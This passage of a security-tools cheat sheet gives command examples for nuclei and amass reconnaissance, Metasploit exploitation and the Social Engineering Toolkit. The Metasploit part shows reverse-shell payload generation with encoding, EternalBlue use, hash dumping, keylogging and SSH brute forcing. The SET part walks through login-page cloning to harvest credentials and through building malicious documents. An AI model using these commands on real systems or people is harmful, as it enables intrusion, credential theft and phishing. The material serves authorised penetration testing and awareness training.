nuclei -l urls.txt -proxy http://127.0.0.1:8080  # HTTP proxy
nuclei -l urls.txt -proxy-socks-url socks5://127.0.0.1:9050

# Headers and authentication
nuclei -l urls.txt -H "Authorization: Bearer TOKEN"
nuclei -l urls.txt -H "Cookie: session=abc123"

# Resume scan
nuclei -l urls.txt -resume resume.cfg           # Resume from state

# Custom templates
nuclei -u https://example.com -t custom-template.yaml
nuclei -u https://example.com -w custom-workflows/

# Reporting
nuclei -l urls.txt -report-config config.yaml   # Custom reporting
nuclei -l urls.txt -report-db db.sqlite         # Database reporting

# Practical examples
# Full vulnerability scan
nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high,medium -o vulns.txt

# CVE scanning
nuclei -l urls.txt -t cves/ -severity critical,high -json -o cves.json

# WordPress scanning
subfinder -d wordpress-site.com -silent | httpx -silent | nuclei -t vulnerabilities/wordpress/ -o wp-vulns.txt

# Exposed panel detection
nuclei -l urls.txt -t exposed-panels/ -severity info,low,medium -o panels.txt

# Technology detection
nuclei -l urls.txt -t technologies/ -o tech-stack.txt

# Misconfiguration check
nuclei -l urls.txt -t misconfigurations/ -severity medium,high,critical

# Bug bounty workflow
# 1. Subdomain enumeration
subfinder -d target.com -silent > subs.txt

# 2. HTTP probing
cat subs.txt | httpx -silent -title -tech-detect > active.txt

# 3. Vulnerability scanning
cat active.txt | nuclei -t ~/nuclei-templates/ -severity critical,high -o critical-vulns.txt

# Continuous monitoring
nuclei -l assets.txt -t cves/2024/ -severity critical -silent | notify

# Custom severity scan
nuclei -l urls.txt -severity critical,high -t cves/ -t vulnerabilities/ -json -o high-priority.json

# Scan with custom wordlist
nuclei -l urls.txt -t fuzzing-templates/ -var wordlist=custom-words.txt

# Distributed scanning
nuclei -l urls.txt -t templates/ -c 50 -rate-limit 150 -stats

# Integration with other tools
# subfinder → httpx → nuclei pipeline
subfinder -d target.com -silent | httpx -silent -follow-redirects | nuclei -t cves/ -o results.txt
```

---


### **amass** - Comprehensive OSINT Tool**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #osint, #reconnaissance, #subdomain-enumeration, #network-mapping, #asset-discovery]
related: [subfinder, nmap, theHarvester, recon-ng]
keywords: [amass, osint, subdomain enumeration, network mapping, asset discovery, dns enumeration, reconnaissance]
synonyms: [osint-tool, recon-framework]
platform: [macOS, Linux, Windows]
installation: brew install amass
-->
**Description**: In-depth attack surface mapping and asset discovery through OSINT and active reconnaissance
**Location**: `/opt/homebrew/bin/amass`
**Common Use Cases**:

- Subdomain enumeration
- Asset discovery
- Network mapping
- Attack surface analysis
- DNS reconnaissance
- Bug bounty hunting

**Why Essential**: Most comprehensive OSINT and reconnaissance tool with both passive and active techniques.

**See Also**: `subfinder` (fast passive enum), `nmap` (port scanning), `theHarvester` (email gathering)

**Examples**:

```bash
# Basic enumeration
amass enum -d example.com                       # Basic scan
amass enum -d example.com -o results.txt        # Save results
amass enum -passive -d example.com              # Passive only (no DNS)

# Active enumeration
amass enum -active -d example.com               # Active reconnaissance
amass enum -brute -d example.com                # Brute force subdomains
amass enum -d example.com -src                  # Show data sources

# Multiple domains
amass enum -d example.com,test.com              # Multiple domains
amass enum -df domains.txt                      # From file

# Brute forcing
amass enum -brute -d example.com                # Brute force
amass enum -brute -d example.com -w wordlist.txt  # Custom wordlist
amass enum -brute -d example.com -wm 3          # Min 3 characters
amass enum -brute -d example.com -rf resolvers.txt  # Custom resolvers

# IP ranges
amass intel -addr 192.168.1.0/24                # Reverse lookup
amass intel -asn 15169                          # Google's ASN
amass intel -org "Example Corp"                 # Organization

# Intelligence gathering
amass intel -d example.com                      # Find root domains
amass intel -whois -d example.com               # WHOIS data
amass track -d example.com                      # Track changes over time

# Output formats
amass enum -d example.com -o output.txt         # Text output
amass enum -d example.com -json output.json     # JSON output
amass enum -d example.com -dir results/         # Output directory
amass viz -d3 -d example.com                    # D3.js visualization
amass viz -dot -d example.com                   # Graphviz DOT

# Configuration
amass enum -d example.com -config config.ini    # Custom config
amass enum -d example.com -alts                 # Alternative names
amass enum -d example.com -include *.dev.example.com

# Performance
amass enum -d example.com -max-dns-queries 200  # Max DNS queries/sec
amass enum -d example.com -timeout 3            # Timeout minutes
amass enum -d example.com -max-depth 3          # Recursion depth

# Data sources
amass enum -list                                # List data sources
amass enum -d example.com -exclude AlienVault   # Exclude source
amass enum -d example.com -include Shodan,Censys  # Specific sources

# Advanced options
amass enum -d example.com -v                    # Verbose
amass enum -d example.com -debug                # Debug mode
amass enum -d example.com -silent               # Silent (results only)
amass enum -d example.com -nolocaldb            # No local database
amass enum -d example.com -norecursive          # No recursive brute force

# Database operations
amass db -names -d example.com                  # Show database names
amass db -show -d example.com                   # Show all records
amass db -summary -d example.com                # Summary
amass db -import results.txt                    # Import data

# Visualization
amass viz -d example.com -d3                    # D3 visualization
amass viz -d example.com -dot                   # DOT format
amass viz -d example.com -graphistry            # Graphistry
amass viz -d example.com -maltego               # Maltego

# Practical examples
# Comprehensive enumeration
amass enum -active -brute -d example.com -o full_enum.txt

# Passive reconnaissance
amass enum -passive -d example.com -src -o passive_results.txt

# Find subdomains with specific pattern
amass enum -d example.com | grep -E "(api|admin|dev|staging)"

# Track changes
amass track -d example.com -last 7              # Last 7 days
amass track -d example.com -since 2024-01-01    # Since date

# Organization intelligence
amass intel -org "Target Company" -whois        # Find domains
amass intel -addr 1.2.3.0/24                    # IP range recon

# ASN enumeration
amass intel -asn 15169                          # Find all IPs
amass enum -d example.com -cidr 1.2.3.0/24      # Scan CIDR

# Integration with other tools
# Amass → httpx → nuclei
amass enum -passive -d target.com -o subs.txt
cat subs.txt | httpx -silent -title > active.txt
cat active.txt | nuclei -t ~/nuclei-templates/ -o vulns.txt

# Amass → nmap
amass enum -d target.com -o domains.txt
cat domains.txt | xargs -I {} nmap -sC -sV {} -oN {}.nmap

# Compare scans
amass enum -d example.com -o scan1.txt
# Later...
amass enum -d example.com -o scan2.txt
diff scan1.txt scan2.txt

# Bug bounty workflow
# 1. Find all domains for organization
amass intel -org "Bug Bounty Company"

# 2. Full active enumeration
amass enum -active -brute -d target.com -o domains.txt

# 3. Visualize attack surface
amass viz -d target.com -d3 -dir visualization/

# Continuous monitoring
amass track -d example.com -json | jq '.name' > new_subdomains.txt

# Custom config example
# config.ini:
# [bruteforce]
# wordlist = /path/to/wordlist.txt
# minimum_for_wordlist = 1
#
# [data_sources.Shodan]
# [data_sources.Shodan.Credentials]
# apikey = YOUR_API_KEY

amass enum -d example.com -config config.ini
```

---


## Exploitation Frameworks & Post-Exploitation

### **metasploit** - Penetration Testing Framework**Difficulty**: ⭐⭐⭐⭐⭐ Expert

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐⭐ Expert
aliases: [msfconsole, msfvenom, meterpreter]
tags: [#security, #exploitation, #penetration-testing, #framework, #post-exploitation]
related: [nmap, burpsuite, sqlmap, armitage]
keywords: [metasploit, exploitation framework, penetration testing, msfconsole, msfvenom, meterpreter, exploit development]
synonyms: [msf, exploitation-framework, pentest-framework]
platform: [macOS, Linux, Windows]
installation: brew install metasploit
-->
**Description**: The world's most used penetration testing framework - comprehensive exploit development and execution platform
**Location**: `/opt/homebrew/bin/msfconsole`
**Common Use Cases**:

- Penetration testing
- Exploit development
- Vulnerability validation
- Post-exploitation
- Security research
- Red team operations

**Why Essential**: Industry-standard framework with 2000+ exploits, payloads, and auxiliary modules for comprehensive penetration testing.

**See Also**: `nmap` (reconnaissance), `sqlmap` (web exploitation), `burpsuite` (web testing)

**Examples**:

```bash
# Start Metasploit console
msfconsole                                      # Interactive console
msfconsole -q                                   # Quiet mode (no banner)

# Basic commands
help                                            # Show help
search type:exploit platform:linux              # Search exploits
use exploit/multi/handler                       # Use a module
show options                                    # Show module options
set LHOST 192.168.1.100                         # Set option
run                                             # Execute module
back                                            # Exit current module

# Search for exploits
search ms17-010                                 # EternalBlue
search apache                                   # Apache exploits
search wordpress                                # WordPress exploits
search type:auxiliary smb                       # SMB auxiliary modules
search cve:2021 platform:windows                # Windows CVEs from 2021

# Information gathering
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SMB scanning
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Database commands
workspace                                       # List workspaces
workspace -a pentest                            # Add workspace
workspace pentest                               # Switch workspace
db_nmap -sV 192.168.1.1                        # Run nmap and save to DB
hosts                                           # List discovered hosts
services                                        # List discovered services
vulns                                           # List vulnerabilities

# Exploit usage
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
check                                           # Check if target is vulnerable
exploit                                         # Run exploit

# Payload generation with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

# Encoding payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List payloads
msfvenom --list payloads                        # All payloads
msfvenom --list payloads | grep meterpreter     # Meterpreter payloads
msfvenom --list encoders                        # List encoders
msfvenom --list formats                         # Output formats

# Meterpreter commands (post-exploitation)
# After getting a meterpreter session:
sysinfo                                         # System information
getuid                                          # Current user
ps                                              # Process list
migrate PID                                     # Migrate to process
hashdump                                        # Dump password hashes
screenshot                                      # Take screenshot
keyscan_start                                   # Start keylogger
keyscan_dump                                    # Dump keystrokes
download /etc/passwd                            # Download file
upload shell.exe C:\\Windows\\Temp              # Upload file
shell                                           # Drop to system shell
execute -f cmd.exe -i -H                        # Execute command

# Session management
sessions                                        # List active sessions
sessions -i 1                                   # Interact with session 1
sessions -u 1                                   # Upgrade to meterpreter
sessions -K                                     # Kill all sessions

# Handler for reverse connections
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j                                      # Run as background job

# Resource scripts
makerc /tmp/commands.rc                         # Save commands to script
msfconsole -r script.rc                         # Run resource script

# Web delivery
use exploit/multi/script/web_delivery
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# Practical examples
# Full attack workflow
db_nmap -sV -p- 192.168.1.10                   # Scan and save to DB
vulns                                           # Check for known vulns
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# Post-exploitation enumeration
run post/windows/gather/enum_shares               # Enumerate shares
run post/windows/gather/credentials/windows_autologin  # AutoLogin creds
run post/multi/recon/local_exploit_suggester      # Suggest privilege escalation

# Pivoting
route add 10.0.0.0/24 1                          # Add route through session 1
use auxiliary/server/socks_proxy                 # SOCKS proxy
run

# Generate multi-platform payloads
# Windows
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o payload.macho

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
```

---


### **set** - Social Engineering Toolkit**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: [setoolkit]
tags: [#security, #social-engineering, #phishing, #penetration-testing, #spear-phishing]
related: [metasploit, gophish, beef]
keywords: [social engineering toolkit, set, phishing, credential harvesting, spear phishing, social engineering]
synonyms: [setoolkit, phishing-framework]
platform: [macOS, Linux]
installation: brew install set
-->
**Description**: Open-source social engineering framework designed for penetration testing and security awareness
**Location**: `/opt/homebrew/bin/setoolkit`
**Common Use Cases**:

- Social engineering attacks
- Phishing campaigns
- Credential harvesting
- Security awareness training
- Penetration testing
- Red team operations

**Why Essential**: Specialized framework for social engineering attacks with numerous attack vectors and templates.

**See Also**: `metasploit` (exploitation), `gophish` (phishing), `beef` (browser exploitation)

**Examples**:

```bash
# Start SET
setoolkit                                       # Interactive menu
sudo setoolkit                                  # Run with sudo (required)

# Main menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit
# 5) Update SET configuration
# 6) Help, Credits, and About

# Social Engineering Attacks menu:
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors
# 10) SMS Spoofing Attack Vector

# Website Attack Vectors:
# 1) Java Applet Attack Method
# 2) Metasploit Browser Exploit Method
# 3) Credential Harvester Attack Method
# 4) Tabnabbing Attack Method
# 5) Web Jacking Attack Method
# 6) Multi-Attack Web Method
# 7) HTA Attack Method

# Credential Harvester example workflow:
# 1. Select Social-Engineering Attacks
# 2. Select Website Attack Vectors
# 3. Select Credential Harvester Attack Method
# 4. Select Site Cloner
# 5. Enter IP address for POST back
# 6. Enter URL to clone (e.g., https://gmail.com)
# SET will clone the site and capture credentials

# Spear-Phishing Attack example:
# 1. Select Social-Engineering Attacks
# 2. Select Spear-Phishing Attack Vectors
# 3. Select Create a FileFormat Payload
# 4. Select PDF Embedded EXE
# 5. Choose payload (Metasploit reverse shell)
# 6. Set LHOST and LPORT
# 7. Create malicious PDF

# Mass Mailer Attack:
# 1. Select Social-Engineering Attacks
# 2. Select Mass Mailer Attack
# 3. Select E-Mail Attack (single/mass)
# 4. Select Use a Gmail Account
# 5. Enter Gmail credentials
# 6. Enter target email addresses
# 7. Craft email message
# 8. Attach payload

# Infectious Media Generator:
# 1. Select Social-Engineering Attacks
# 2. Select Infectious Media Generator
# 3. Select File-Format Exploits
# 4. Select PDF Embedded EXE
# 5. Choose Metasploit payload
# 6. Configure LHOST/LPORT
# 7. Output infectious PDF

# Powershell Attack Vectors:
# 1. Select Social-Engineering Attacks
# 2. Select Powershell Attack Vectors
# 3. Select Powershell Alphanumeric Shellcode Injector
# 4. Enter LHOST
# 5. Enter LPORT
# 6. Generate Powershell payload

# QRCode Generator:
# 1. Select Social-Engineering Attacks
# 2. Select QRCode Generator Attack Vector
# 3. Enter malicious URL
# 4. SET generates QR code

# Configuration
# Edit: ~/.set/config
# Key settings:
# - METASPLOIT_PATH
# - SENDMAIL
# - WEBATTACK_EMAIL

# Practical examples
# Clone login page
sudo setoolkit
# 1 -> 2 -> 3 -> 2
# Enter your IP: 192.168.1.100
# Enter URL to clone: https://www.facebook.com
# Victims visit http://192.168.1.100, enter creds
# Credentials captured in SET terminal

# Create malicious Office document
sudo setoolkit
# 1 -> 3 -> 1 -> 1
# Select Metasploit payload
# Configure LHOST/LPORT
# Embed in Word/Excel document

# Arduino-based attack
sudo setoolkit
# 1 -> 6
# Create payload for Arduino
# Deploy physical attack

# SMS Spoofing
sudo setoolkit
# 1 -> 10
# Configure SMS gateway
# Send spoofed SMS

# Update SET
sudo setoolkit
# 4 -> Update

# Integration with Metasploit
# SET can generate payloads that connect back to Metasploit
# 1. Start Metasploit handler:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"

# 2. Generate payload with SET
sudo setoolkit
# Create payload with matching LHOST/LPORT

# Security awareness training
# Use SET to demonstrate attack vectors
# Show credential harvesting
# Demonstrate phishing effectiveness
# Train users to recognize attacks
```

---

